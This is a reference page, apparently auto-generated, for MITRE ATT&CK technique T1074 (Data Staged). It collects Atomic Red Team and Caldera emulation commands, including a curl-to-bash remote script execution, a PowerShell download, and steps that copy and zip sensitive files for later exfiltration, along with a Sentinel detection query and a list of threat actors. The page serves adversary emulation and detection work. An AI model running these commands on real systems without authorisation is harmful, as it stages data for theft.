
# Data Staged

## Description

### MITRE Description

> Collected data is staged in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Data Compressed](https://attack.mitre.org/techniques/T1002) or [Data Encrypted](https://attack.mitre.org/techniques/T1022).

Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1074

## Potential Commands

```
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat" -OutFile $env:TEMP\discovery.bat

curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > /tmp/T1074_discovery.log

Compress-Archive -Path PathToAtomicsFolder\T1074\bin\Folder_to_zip -DestinationPath #{output_file} -Force

Compress-Archive -Path #{input_file} -DestinationPath $env:TEMP\Folder_to_zip.zip -Force

{'darwin': {'sh': {'command': 'cp "#{host.file.path[filters(technique=T1005,max=3)]}" #{host.dir.staged[filters(max=1)]}\n'}}, 'linux': {'sh': {'command': 'cp "#{host.file.path[filters(technique=T1005,max=3)]}" #{host.dir.staged[filters(max=1)]}\n'}}, 'windows': {'psh': {'command': 'Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n'}, 'cmd': {'command': 'copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]\n'}}}
{'darwin': {'sh': {'command': 'mkdir -p staged && echo $PWD/staged\n', 'cleanup': 'rm -rf staged\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.staged'}]}}}, 'linux': {'sh': {'command': 'mkdir -p staged && echo $PWD/staged\n', 'cleanup': 'rm -rf staged\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.staged'}]}}}, 'windows': {'psh,pwsh': {'command': 'New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object\n', 'cleanup': 'Remove-Item -Path "staged" -recurse\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.staged'}]}}}}
```

## Commands Dataset

```
[{'command': 'Invoke-WebRequest '
             '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat" '
             '-OutFile $env:TEMP\\discovery.bat\n',
  'name': None,
  'source': 'atomics/T1074/T1074.yaml'},
 {'command': 'curl -s '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh '
             '| bash -s > /tmp/T1074_discovery.log\n',
  'name': None,
  'source': 'atomics/T1074/T1074.yaml'},
 {'command': 'Compress-Archive -Path '
             'PathToAtomicsFolder\\T1074\\bin\\Folder_to_zip -DestinationPath '
             '#{output_file} -Force\n',
  'name': None,
  'source': 'atomics/T1074/T1074.yaml'},
 {'command': 'Compress-Archive -Path #{input_file} -DestinationPath '
             '$env:TEMP\\Folder_to_zip.zip -Force\n',
  'name': None,
  'source': 'atomics/T1074/T1074.yaml'},
 {'command': {'darwin': {'sh': {'command': 'cp '
                                           '"#{host.file.path[filters(technique=T1005,max=3)]}" '
                                           '#{host.dir.staged[filters(max=1)]}\n'}},
              'linux': {'sh': {'command': 'cp '
                                          '"#{host.file.path[filters(technique=T1005,max=3)]}" '
                                          '#{host.dir.staged[filters(max=1)]}\n'}},
              'windows': {'cmd': {'command': 'copy '
                                             '#{host.file.path[filters(technique=T1005,max=3)]} '
                                             '#{host.dir.staged[filters(max=1)]\n'},
                          'psh': {'command': 'Copy-Item '
                                             '#{host.file.path[filters(technique=T1005,max=3)]} '
                                             '#{host.dir.staged[filters(max=1)]}\n'}}},
  'name': 'copy files to staging directory',
  'source': 'data/abilities/collection/4e97e699-93d7-4040-b5a3-2e906a58199e.yml'},
 {'command': {'darwin': {'sh': {'cleanup': 'rm -rf staged\n',
                                'command': 'mkdir -p staged && echo '
                                           '$PWD/staged\n',
                                'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.staged'}]}}},
              'linux': {'sh': {'cleanup': 'rm -rf staged\n',
                               'command': 'mkdir -p staged && echo '
                                          '$PWD/staged\n',
                               'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.staged'}]}}},
              'windows': {'psh,pwsh': {'cleanup': 'Remove-Item -Path "staged" '
                                                  '-recurse\n',
                                       'command': 'New-Item -Path "." -Name '
                                                  '"staged" -ItemType '
                                                  '"directory" -Force | '
                                                  'foreach {$_.FullName} | '
                                                  'Select-Object\n',
                                       'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.staged'}]}}}},
  'name': 'create a directory for exfil staging',
  'source': 'data/abilities/collection/6469befa-748a-4b9c-a96d-f191fde47d89.yml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'Datal Staged Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_command_line contains '
           '"DownloadString"and process_command_line contains '
           '"Net.WebClient")or (process_command_line contains "New-Object"and '
           'process_command_line contains "IEX")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Data Staged': {'atomic_tests': [{'description': 'Utilize '
                                                                          'powershell '
                                                                          'to '
                                                                          'download '
                                                                          'discovery.bat '
                                                                          'and '
                                                                          'save '
                                                                          'to '
                                                                          'a '
                                                                          'local '
                                                                          'file. '
                                                                          'This '
                                                                          'emulates '
                                                                          'an '
                                                                          'attacker '
                                                                          'downloading '
                                                                          'data '
                                                                          'collection '
                                                                          'tools '
                                                                          'onto '
                                                                          'the '
                                                                          'host. '
                                                                          'Upon '
                                                                          'execution,\n'
                                                                          'verify '
                                                                          'that '
                                                                          'the '
                                                                          'file '
                                                                          'is '
                                                                          'saved '
                                                                          'in '
                                                                          'the '
                                                                          'temp '
                                                                          'directory.\n',
                                                           'executor': {'cleanup_command': 'Remove-Item '
                                                                                           '-Force '
                                                                                           '#{output_file} '
                                                                                           '-ErrorAction '
                                                                                           'Ignore\n',
                                                                        'command': 'Invoke-WebRequest '
                                                                                   '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat" '
                                                                                   '-OutFile '
                                                                                   '#{output_file}\n',
                                                                        'elevation_required': False,
                                                                        'name': 'powershell'},
                                                           'input_arguments': {'output_file': {'default': '$env:TEMP\\discovery.bat',
                                                                                               'description': 'Location '
                                                                                                              'to '
                                                                                                              'save '
                                                                                                              'downloaded '
                                                                                                              'discovery.bat '
                                                                                                              'file',
                                                                                               'type': 'Path'}},
                                                           'name': 'Stage data '
                                                                   'from '
                                                                   'Discovery.bat',
                                                           'supported_platforms': ['windows']},
                                                          {'description': 'Utilize '
                                                                          'curl '
                                                                          'to '
                                                                          'download '
                                                                          'discovery.sh '
                                                                          'and '
                                                                          'execute '
                                                                          'a '
                                                                          'basic '
                                                                          'information '
                                                                          'gathering '
                                                                          'shell '
                                                                          'script\n',
                                                           'executor': {'command': 'curl '
                                                                                   '-s '
                                                                                   'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh '
                                                                                   '| '
                                                                                   'bash '
                                                                                   '-s '
                                                                                   '> '
                                                                                   '#{output_file}\n',
                                                                        'name': 'bash'},
                                                           'input_arguments': {'output_file': {'default': '/tmp/T1074_discovery.log',
                                                                                               'description': 'Location '
                                                                                                              'to '
                                                                                                              'save '
                                                                                                              'downloaded '
                                                                                                              'discovery.bat '
                                                                                                              'file',
                                                                                               'type': 'Path'}},
                                                           'name': 'Stage data '
                                                                   'from '
                                                                   'Discovery.sh',
                                                           'supported_platforms': ['linux',
                                                                                   'macos']},
                                                          {'description': 'Use '
                                                                          'living '
                                                                          'off '
                                                                          'the '
                                                                          'land '
                                                                          'tools '
                                                                          'to '
                                                                          'zip '
                                                                          'a '
                                                                          'file '
                                                                          'and '
                                                                          'stage '
                                                                          'it '
                                                                          'in '
                                                                          'the '
                                                                          'Windows '
                                                                          'temporary '
                                                                          'folder '
                                                                          'for '
                                                                          'later '
                                                                          'exfiltration. '
                                                                          'Upon '
                                                                          'execution, '
                                                                          'Verify '
                                                                          'that '
                                                                          'a '
                                                                          'zipped '
                                                                          'folder '
                                                                          'named '
                                                                          'Folder_to_zip.zip\n'
                                                                          'was '
                                                                          'placed '
                                                                          'in '
                                                                          'the '
                                                                          'temp '
                                                                          'directory.\n',
                                                           'executor': {'cleanup_command': 'Remove-Item '
                                                                                           '-Path '
                                                                                           '#{output_file} '
                                                                                           '-ErrorAction '
                                                                                           'Ignore\n',
                                                                        'command': 'Compress-Archive '
                                                                                   '-Path '
                                                                                   '#{input_file} '
                                                                                   '-DestinationPath '
                                                                                   '#{output_file} '
                                                                                   '-Force\n',
                                                                        'elevation_required': False,
                                                                        'name': 'powershell'},
                                                           'input_arguments': {'input_file': {'default': 'PathToAtomicsFolder\\T1074\\bin\\Folder_to_zip',
                                                                                              'description': 'Location '
                                                                                                             'of '
                                                                                                             'file '
                                                                                                             'or '
                                                                                                             'folder '
                                                                                                             'to '
                                                                                                             'zip',
                                                                                              'type': 'Path'},
                                                                               'output_file': {'default': '$env:TEMP\\Folder_to_zip.zip',
                                                                                               'description': 'Location '
                                                                                                              'to '
                                                                                                              'save '
                                                                                                              'zipped '
                                                                                                              'file '
                                                                                                              'or '
                                                                                                              'folder',
                                                                                               'type': 'Path'}},
                                                           'name': 'Zip a '
                                                                   'Folder '
                                                                   'with '
                                                                   'PowerShell '
                                                                   'for '
                                                                   'Staging in '
                                                                   'Temp',
                                                           'supported_platforms': ['windows']}],
                                         'attack_technique': 'T1074',
                                         'display_name': 'Data Staged'}},
 {'Mitre Stockpile - copy files to staging directory': {'description': 'copy '
                                                                       'files '
                                                                       'to '
                                                                       'staging '
                                                                       'directory',
                                                        'id': '4e97e699-93d7-4040-b5a3-2e906a58199e',
                                                        'name': 'Stage '
                                                                'sensitive '
                                                                'files',
                                                        'platforms': {'darwin': {'sh': {'command': 'cp '
                                                                                                   '"#{host.file.path[filters(technique=T1005,max=3)]}" '
                                                                                                   '#{host.dir.staged[filters(max=1)]}\n'}},
                                                                      'linux': {'sh': {'command': 'cp '
                                                                                                  '"#{host.file.path[filters(technique=T1005,max=3)]}" '
                                                                                                  '#{host.dir.staged[filters(max=1)]}\n'}},
                                                                      'windows': {'cmd': {'command': 'copy '
                                                                                                     '#{host.file.path[filters(technique=T1005,max=3)]} '
                                                                                                     '#{host.dir.staged[filters(max=1)]\n'},
                                                                                  'psh': {'command': 'Copy-Item '
                                                                                                     '#{host.file.path[filters(technique=T1005,max=3)]} '
                                                                                                     '#{host.dir.staged[filters(max=1)]}\n'}}},
                                                        'requirements': [{'plugins.stockpile.app.requirements.paw_provenance': [{'source': 'host.file.path'}]},
                                                                         {'plugins.stockpile.app.requirements.paw_provenance': [{'source': 'host.dir.staged'}]}],
                                                        'tactic': 'collection',
                                                        'technique': {'attack_id': 'T1074',
                                                                      'name': 'Data '
                                                                              'Staged'}}},
 {'Mitre Stockpile - create a directory for exfil staging': {'description': 'create '
                                                                            'a '
                                                                            'directory '
                                                                            'for '
                                                                            'exfil '
                                                                            'staging',
                                                             'id': '6469befa-748a-4b9c-a96d-f191fde47d89',
                                                             'name': 'Create '
                                                                     'staging '
                                                                     'directory',
                                                             'platforms': {'darwin': {'sh': {'cleanup': 'rm '
                                                                                                        '-rf '
                                                                                                        'staged\n',
                                                                                             'command': 'mkdir '
                                                                                                        '-p '
                                                                                                        'staged '
                                                                                                        '&& '
                                                                                                        'echo '
                                                                                                        '$PWD/staged\n',
                                                                                             'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.staged'}]}}},
                                                                           'linux': {'sh': {'cleanup': 'rm '
                                                                                                       '-rf '
                                                                                                       'staged\n',
                                                                                            'command': 'mkdir '
                                                                                                       '-p '
                                                                                                       'staged '
                                                                                                       '&& '
                                                                                                       'echo '
                                                                                                       '$PWD/staged\n',
                                                                                            'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.staged'}]}}},
                                                                           'windows': {'psh,pwsh': {'cleanup': 'Remove-Item '
                                                                                                               '-Path '
                                                                                                               '"staged" '
                                                                                                               '-recurse\n',
                                                                                                    'command': 'New-Item '
                                                                                                               '-Path '
                                                                                                               '"." '
                                                                                                               '-Name '
                                                                                                               '"staged" '
                                                                                                               '-ItemType '
                                                                                                               '"directory" '
                                                                                                               '-Force '
                                                                                                               '| '
                                                                                                               'foreach '
                                                                                                               '{$_.FullName} '
                                                                                                               '| '
                                                                                                               'Select-Object\n',
                                                                                                    'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.staged'}]}}}},
                                                             'tactic': 'collection',
                                                             'technique': {'attack_id': 'T1074',
                                                                           'name': 'Data '
                                                                                   'Staged'}}}]
```

# Tactics


* [Collection](../tactics/Collection.md)


# Mitigations

None

# Actors


* [APT3](../actors/APT3.md)

* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [Honeybee](../actors/Honeybee.md)
    
* [APT28](../actors/APT28.md)
    
* [FIN5](../actors/FIN5.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [FIN6](../actors/FIN6.md)
    
* [menuPass](../actors/menuPass.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [FIN8](../actors/FIN8.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [Night Dragon](../actors/Night-Dragon.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [Machete](../actors/Machete.md)
    
